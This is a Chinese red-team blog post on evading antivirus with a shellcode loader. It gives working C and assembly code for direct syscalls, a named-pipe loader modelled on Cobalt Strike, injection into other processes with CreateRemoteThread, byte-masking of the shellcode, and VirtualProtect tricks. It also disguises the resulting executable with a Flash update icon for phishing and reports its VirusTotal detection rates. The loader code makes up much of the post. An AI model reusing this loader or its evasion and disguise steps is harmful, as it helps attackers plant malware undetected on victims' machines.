> 原文链接: https://www.anquanke.com//post/id/190354 


# Shellcode 杀软对抗实战（启航篇）


                                阅读量   
                                **1010657**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                    



[![](https://p4.ssl.qhimg.com/t017a5efd9687ea7681.png)](https://p4.ssl.qhimg.com/t017a5efd9687ea7681.png)



隶属于 360 公司信息安全中心，我们深谙“未知攻，焉知防”，团队成员专注于各类漏洞利用研究，在红蓝对抗、区块链安全、代码审计拥有多年资深经验。

author：boi@360RedTeam

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。



## 0x00 序

在Redteam参与企业安全建设或者红蓝对抗的情况下，我们可能需要利用一些可执行文件来完成既定任务。而随着企业对网络安全主机安全重视程度的提高，目标主机上通常存在一些终端防护软件，为了保证任务能够顺利进行，我们需要对可执行文件进行免杀操作。本篇文章是自己在免杀学习的一些记录，主要着重于基础，通过分析Cobaltstrike Kit中使用的命名管道技术引出几个绕过思路，希望借此抛砖引玉、以攻促防，同时希望能够引起红蓝双方的重视。

毕竟，自己动手，丰衣足食。



## 0x01 知己知彼

目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。

对特征来讲，大多数杀毒软件会定义一个阈值，当文件内部的特征数量达到一定程度就会触发报警，也不排除杀软会针对某个EXP会限制特定的入口函数来查杀。当然还有通过md5，sha1等hash函数来识别恶意软件，这也是最简单粗暴，最容易绕过的。 针对特征的免杀较为好做，可以使用加壳改壳、添加/替换资源、修改已知特征码/会增加查杀概率的单词（比如某函数名为ExecutePayloadshellcode）、加密Shellcode等等。

对行为来讲，很多个API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如下图所示，使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。

[![](https://p2.ssl.qhimg.com/t01e2518a35a0311e8d.png)](https://p2.ssl.qhimg.com/t01e2518a35a0311e8d.png)

```
//使用ZwAllocateVirtualMemory 所需要的一些函数定义
ZwAllocateVirtualMemory proc
       mov r10, rcx
       mov eax, 18h
       syscall
       ret
ZwAllocateVirtualMemory endp

EXTERN_C NTSTATUS ZwAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

NTSTATUS(*NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );
```

另外，还可以使用py,go,c#等多种语言编译程序，会有意想不到的效果。



## 0x02 Windows命名管道的分析、利用与复现

在CobaltStrike的Kit中，我们可以看到CS实现了一套Bypass脚本，如下图所示。本篇文章着重分析bypass-pipe.c中的技术—即使用命名管道对杀软进行绕过测试。

[![](https://p5.ssl.qhimg.com/t01f4b2c48a28a77895.png)](https://p5.ssl.qhimg.com/t01f4b2c48a28a77895.png)

命名管道是一个具有名称，可以单向或双面在一个服务器和一个或多个客户端之间进行通讯的管道。命名管道的所有实例拥有相同的名称，但是每个实例都有其自己的缓冲区和句柄，用来为不同客户端通许提供独立的管道。使用实例可使多个管道客户端同时使用相同的命名管道。 关于命名管道的更多介绍，请见[Windows 命名管道研究初探](https://www.anquanke.com/post/id/190207)

CS使用了进程内通信的方法，在进程内部创建命名管道并在进程内部调用。这种方法能够规避掉一些AV/EDR的查杀操作，具体的执行流程如下图所示。

[![](https://p2.ssl.qhimg.com/t01bce12f1197eb88fa.png)](https://p2.ssl.qhimg.com/t01bce12f1197eb88fa.png)

首先主进程使用CreateNamedPipeA函数在进程内部创建了一个内部的命名管道，并将Shellcode写入到命名管道中（注：Shellcode可以使用HTTP/TCP/UDP/ICMP等等多个协议通过网络传输，以此可以做到Shellcode字符串不落地，大大增加了免杀的概率）。此刻，命名管道可以理解为一个监听，时刻等待着客户端与其连接，并将数据传递给客户端。其中CreateNamedPipeA函数使用PIPE_ACCESS_OUTBOUND参数限制数据流只允许从命名管道的服务端传到命名管道的客户端。详细的参数信息可以见官方文档[CreateNamedPipeA](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)。

随后使用CreateFileA函数创建一个命名管道的客户端，用于接收命名管道中存储的Shellcode。

最后使用CreateThread函数在该进程下创建了一个子线程加载Shellcode，我们也完全可以使用CreateRemoteThread函数将Shellcode注入到其他的进程中，以此防止该可执行文件被关闭导致的“掉线“。另外，还可以弹框UAC来提高控制权限，与此同时也会增加钓鱼的难度，因此还需要根据具体的攻击场景与需求来定制最适合自己的Shellcode Loader。

相关代码如下

```
//创建命名管道服务端，用于向客户端发送数据
void server(char * data, int length) `{`
    DWORD  wrote = 0;
    HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);
    if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
       return;
    BOOL result = ConnectNamedPipe(pipe, NULL);
    if (!result)
       return;
    while (length &gt; 0) `{`
       result = WriteFile(pipe, data, length, &amp;wrote, NULL);
       if (!result)
           break;
       data   += wrote;
       length -= wrote;
    `}`
    CloseHandle(pipe);
`}`

    //创建命名管道客户端
BOOL client(char * buffer, int length) `{`
    DWORD  read = 0;
    HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ |
     FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (pipe == INVALID_HANDLE_VALUE)
          return FALSE;
    while (length &gt; 0) `{`
       BOOL result = ReadFile(pipe, buffer, length, &amp;read, NULL);
       if (!result)
           break;
       buffer += read;
       length -= read;
    `}`
    CloseHandle(pipe);
    return TRUE;
`}`

    //将Shellcode 注入到其他进程
    HANDLE hProcess = NULL;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
    HMODULE modHandle = GetModuleHandle(_T("Kernel32"));
    LPTHREAD_START_ROUTINE addr = (LPTHREAD_START_ROUTINE)GetProcAddress(modHandle, "LoadLibraryA");
    void* pLibRemote = VirtualAllocEx(hProcess, NULL, sizeof(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pLibRemote, (void*)data, sizeof(data), NULL);
    CreateRemoteThread(hProcess, NULL, 0,
       addr,
       pLibRemote,
       0,
       NULL);
       
    //创建子进程
    DWORD WINAPI StartAddress(LPVOID lpThreadParameter)`{`
    return ((int(__stdcall*)(LPVOID))lpThreadParameter)(lpThreadParameter);
`}`
    s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, buff, 0, 0);
    WaitForSingleObject(s, 0xFFFFFFFF);
```

最后，我们希望可执行工具在红队使用中达到更逼真的效果，因此加入了Flash的更新图标，方法如下：VisualStudio 解决方案资源管理器-&gt;右击资源文件，添加资源，选择icon 导入即可。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01549f75fd576b1133.png)

事以愿违，VirusTotal的查杀结果显示在70个杀软中有21个检测出了木马，虽然比CS直接生成的artifact.exe要好一些，但是并不能令我们满意（Avast/AVG/McAfee/Tencent等均未查杀出木马）。下图为artifact和使用命名管道实现的Shelllcode加载器在VirusTotal上面的表现情况对比。

[![](https://p1.ssl.qhimg.com/t01549eadd683726766.png)](https://p1.ssl.qhimg.com/t01549eadd683726766.png)

[![](https://p5.ssl.qhimg.com/t01713130c8fd367d5e.png)](https://p5.ssl.qhimg.com/t01713130c8fd367d5e.png)

而且使用360套件对其进行测试，360也成功防护了此次模拟攻击测试。因此，我们需要思考可以从哪些方式可以对此Shellcode Loader进行修改来绕过常规杀软对该木马的检测。

[![](https://p3.ssl.qhimg.com/t01205489e203e31ffd.png)](https://p3.ssl.qhimg.com/t01205489e203e31ffd.png)



## 0x03 Shellcode加密 &amp; 页面区域保护

首先，我们可以处理Shellcode的字符串以减少特征码来降低查杀率，常规的Shellcode编码操作包括Base64编码、Hex编码等等，但是从经验来看，编码操作可能会被AV捕捉分析，因此不推荐使用。除了编码，我们还可以对Shellcode进行加密，如异或、AES、RSA或者自定加密格式的加密。

此处经过不断Fuzz，我们将shellcode每隔3个字节替换为0x00，用于逃避特征码检测。

```
//解密
unsigned char data[]     = "\xfc\xe8\x89\x00\x00\x00\x60\x89...";
unsigned char enc_data[] = "\x00\xe8\x89\x00\x00\x00\x00\x89...";
char key[] = "\xfc\x00\x60\x31\x8b...";
for (int i = 0; i &lt; sizeof(key); i++) `{`
    memcpy(&amp;enc_data[i * 3], &amp;key[i], 1);
`}`
```

另外，我们可以使用VirtualProtect将shellcode的内存区块设置为可执行，不可读写的权限，以此降低杀软的查杀率，最终效果如下图所示。

```
VirtualProtect(buff, sizeof(data), 0x10, &amp;flOldProtect);
```

[![](https://p5.ssl.qhimg.com/t0169e0959a5e7c1b88.png)](https://p5.ssl.qhimg.com/t0169e0959a5e7c1b88.png)

[![](https://p5.ssl.qhimg.com/t014493d80aafc18bc0.png)](https://p5.ssl.qhimg.com/t014493d80aafc18bc0.png)

[![](https://p4.ssl.qhimg.com/t01f099fc73b72df3ec.png)](https://p4.ssl.qhimg.com/t01f099fc73b72df3ec.png)



## 0x04 总结

本篇首先介绍了杀软的查杀策略及一些对抗手法，并使用了Windows命名管道进程内部通信、增加资源文件、Shellcode加密、VirtualProtect几个技术绕过了安全管家、Defender等杀毒软件的静态、动态以及云防护措施（另外，使用其他语言如C#、python、Go等等实现该Shellcode Loader可能会较为轻松的绕过杀软的防护策略）。

不难看出，一些杀毒软件在对这些恶意手法的检测上仍有遗漏之处，说明其仍需改进查杀策略，比如加强沙盒的动态调试功能，以免非法分子通过该技术绕过防护进行恶意操作。



## 0x05 参考文献

https://www.anquanke.com/post/id/190207

https://bbs.pediy.com/thread-217782.htm

https://www.freebuf.com/sectool/157122.html
